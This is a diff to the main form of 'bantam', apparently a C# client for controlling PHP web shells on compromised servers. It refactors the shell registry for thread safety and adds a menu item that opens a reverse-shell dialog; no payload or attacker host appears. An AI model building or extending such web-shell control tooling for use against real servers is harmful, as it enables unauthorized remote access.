@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -6,8 +7,10 @@ using System.Linq;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
+using bantam.Classes;
+using bantam.Forms;
 
-namespace bantam_php
+namespace bantam
 {
     public partial class BantamMain : Form
     {
@@ -24,7 +27,7 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        public static Dictionary<String, ShellInfo> Shells = new Dictionary<String, ShellInfo>();
+        public static ConcurrentDictionary<String, ShellInfo> Shells = new ConcurrentDictionary<String, ShellInfo>();
 
         /// <summary>
         /// Static Forms
@@ -569,7 +572,9 @@ namespace bantam_php
             if (string.IsNullOrEmpty(g_SelectedShellUrl) == false) {
                 listViewShells.SelectedItems[0].Remove();
                 if (Shells.ContainsKey(g_SelectedShellUrl)) {
-                    Shells.Remove(g_SelectedShellUrl);
+
+                    ShellInfo outShellInfo = new ShellInfo();
+                    Shells.TryRemove(g_SelectedShellUrl, out outShellInfo);
                 }
             }
         }
@@ -596,9 +601,11 @@ namespace bantam_php
             bool gzipRequest = shellInfo.gzipRequestData;
 
             listViewShells.FindItemWithText(shellURL).Remove();
-            Shells.Remove(shellURL);
+
+            ShellInfo shellInfoRemove = new ShellInfo();
+            Shells.TryRemove(shellURL, out shellInfoRemove);
            
-            Shells.Add(shellURL, shellInfo);
+            Shells.TryAdd(shellURL, shellInfo);
             InitializeShellData(shellURL);
         }
 
@@ -649,7 +656,9 @@ namespace bantam_php
                 if (openShellXMLDialog.ShowDialog() == DialogResult.OK) {
                     foreach (ListViewItem lvClients in listViewShells.Items) {
                         if (Shells.ContainsKey(lvClients.Text)) {
-                            Shells.Remove(lvClients.Text);
+
+                            ShellInfo outShellInfo = new ShellInfo();
+                            Shells.TryRemove(lvClients.Text, out outShellInfo);
                         }
                         lvClients.Remove();
                     }
@@ -1315,7 +1324,7 @@ namespace bantam_php
                     result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                 }
 
-                if (string.IsNullOrEmpty(result)) { // TODO level 3 logging
+                if (string.IsNullOrEmpty(result)) {
                     richTextBoxConsoleOutput.Text += "$ " + cmd + "\r\nNo Data Returned\r\n";
                     textBoxConsoleInput.Text = string.Empty;
                     return;
@@ -1617,6 +1626,17 @@ namespace bantam_php
             if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
                 e.Handled = true;
             }
+        }
+
+        private void spawnShellToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            ReverseShell reverseShellForm = new ReverseShell(g_SelectedShellUrl);
+            reverseShellForm.ShowDialog();
+        }
+
+        private void tabPageInfo_Click(object sender, EventArgs e)
+        {
+
         }
 
         /// <summary>
